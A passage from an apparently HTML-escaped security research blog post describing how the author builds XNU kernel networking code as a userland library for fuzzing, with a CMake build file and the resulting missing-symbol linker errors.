day&amp;rsquo;s work, I could try out many iterations of a fuzz target and the edit/build/run cycle. I didn&amp;rsquo;t have a similar mechanism out of the box with XNU. In order to perform a unit test, I would need to rebuild the kernel. And despite XNU being considerably smaller than Chrome, incremental builds were slower due to the older kmk build system. I wanted to try bridging this gap for XNU.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.9elbs1tajoqo"&gt;&lt;span&gt;Setting up the Scaffolding&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;&amp;ldquo;Unit&amp;rdquo; testing a kernel up through the syscall layer sounds like a big task, but it&amp;rsquo;s easier than you&amp;rsquo;d expect if you forgo some complexity. &lt;/span&gt;&lt;span&gt;We&amp;rsquo;ll start by building all of the individual kernel&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;object files from source using the original build flags. But instead of linking everything together to produce the final kernel binary, we link in only the subset of objects containing code in our target attack surface. We then stub or fake the rest of the functionality. Thanks to the recon in the previous section, we already know which functions we want to call from our fuzzer. I used that information to prepare a minimal list of source objects to include in our userland port.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Before we dive in, let&amp;rsquo;s define the overall structure of the project as pictured below. There&amp;rsquo;s going to be a fuzz target implemented in C++ that translates fuzzed inputs into interactions with the userland XNU library. The target code, &lt;/span&gt;&lt;span class="c9"&gt;libxnu&lt;/span&gt;&lt;span&gt;, exposes a few wrapper symbols for syscalls and &lt;/span&gt;&lt;span class="c9"&gt;ip_input&lt;/span&gt;&lt;span&gt;&amp;nbsp;as mentioned in the attack surface review section. The fuzz target also exposes its random sequence of bytes to kernel APIs such as &lt;/span&gt;&lt;span class="c9"&gt;copyin&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c9"&gt;copyout&lt;/span&gt;&lt;span class="c8 c2"&gt;, whose implementations have been replaced with fakes that use fuzzed input data.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;&lt;a href="https://1.bp.blogspot.com/-sj-AyTN1Xts/YH2p2R9P3qI/AAAAAAAAa2M/M4TRaTnkkIcoaqYOZ3nP7rbrhdYY3dZfACNcBGAsYHQ/s600/image1.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-sj-AyTN1Xts/YH2p2R9P3qI/AAAAAAAAa2M/M4TRaTnkkIcoaqYOZ3nP7rbrhdYY3dZfACNcBGAsYHQ/s600/image1.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;To make development more manageable, I decided to create a new build system using CMake, as it supported Ninja for fast rebuilds. One drawback here is the original build system has to be run every time upstream is updated to deal with generated sources, but this is worth it to get a faster development loop. I captured all of the compiler invocations during a normal kernel build and used those to reconstruct the flags passed to build the various kernel subsystems. Here&amp;rsquo;s what that first pass looks like:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.509a56bc4ddc72babc39c522f6fca5af9dbff3f9"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;project&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;libxnu&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;set&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0 c2"&gt;XNU_DEFINES&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0 c2"&gt;DAPPLE&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0 c2"&gt;DKERNEL&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;# ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;set&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0 c2"&gt;XNU_SOURCES&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;conf&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;param&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;kern&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;kern_asl&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;net&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; bsd&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;netinet&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;ip_input&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0 c2"&gt;c&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;# ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;add_library&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;xnu SHARED $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;XNU_SOURCES&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;$&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;FUZZER_FILES&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;$&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;XNU_HEADERS&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;protobuf_generate_cpp&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_SRCS NET_PROTO_HDRS fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;proto&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;add_executable&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer fuzz&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;cc $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_SRCS&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;$&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;NET_PROTO_HDRS&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_include_directories&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer PRIVATE libprotobuf&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;mutator&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;target_compile_options&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;net_fuzzer PRIVATE $&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c0"&gt;FUZZER_CXX_FLAGS&lt;/span&gt;&lt;span class="c1"&gt;})&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;Of course, without the rest of the kernel, we see tons of missing symbols.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c5de84d30da6bb237fe5cdc6ee881ad5d422b21a"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;_zdestroy&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;referenced &lt;/span&gt;&lt;span class="c6"&gt;from&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _if_clone_detach &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;_zfree&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;referenced &lt;/span&gt;&lt;span class="c6"&gt;from&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _kqueue_destroy &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _knote_free &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _kqworkloop_get_or_create &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _kev_delete &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _pipepair_alloc &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;sys_pipe&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _pipepair_destroy_pipe &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;sys_pipe&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _so_cache_timer &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;uipc_socket&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;_zinit&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;referenced &lt;/span&gt;&lt;span class="c6"&gt;from&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _knote_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _kern_event_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _pipeinit &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;sys_pipe&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _socketinit &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;uipc_socket&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _unp_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;uipc_usrreq&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _cfil_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;content_filter&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _tcp_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;tcp_subr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;_zone_change&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;referenced &lt;/span&gt;&lt;span class="c6"&gt;from&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _knote_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _kern_event_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kern_event&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _socketinit &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;uipc_socket&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _cfil_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;content_filter&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _tcp_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;tcp_subr&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _ifa_init &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; _if_clone_attach &lt;/span&gt;&lt;span class="c6"&gt;in&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;libxnu&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;c&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;o&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;ld&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;symbol&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;s&lt;/span&gt;&lt;span 